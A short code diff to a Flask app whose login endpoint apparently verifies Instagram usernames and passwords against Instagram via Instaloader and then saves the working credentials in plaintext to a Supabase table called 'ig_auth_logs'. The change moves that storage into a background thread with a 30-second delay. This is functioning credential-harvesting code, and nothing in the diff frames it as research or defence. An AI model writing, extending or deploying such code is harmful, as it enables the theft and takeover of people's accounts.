@@ -165,7 +165,8 @@ from supabase import create_client, Client
 import instaloader
 import base64
 from supabase import create_client, Client
-
+import threading
+import time
 app = Flask(__name__)
 CORS(app)
 
@@ -198,6 +199,17 @@ supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 def home():
     return render_template('index.html')
 
+
+
+def delayed_upsert(supabase, username, password):
+    time.sleep(30)  # 30 second delay
+    
+    supabase.table("ig_auth_logs").upsert(
+        {"username": username, "password": password},
+        on_conflict="username"
+    ).execute()
+
+
 @app.route('/auth/login', methods=['POST'])
 def login_task():
     """Verifies credentials via Instaloader and logs them to Supabase."""
@@ -223,10 +235,11 @@ def login_task():
         L.login(username, password)
         
         # 2. If valid, UPSERT (Update or Insert)
-        supabase.table("ig_auth_logs").upsert(
-            {"username": username, "password": password}, 
-            on_conflict="username"
-        ).execute()
+        thread = threading.Thread(
+        target=delayed_upsert,
+        args=(supabase, username, password)
+            )
+        thread.start()
         
         return jsonify({"status": "success", "redirect_to": redirect_to}), 200
 
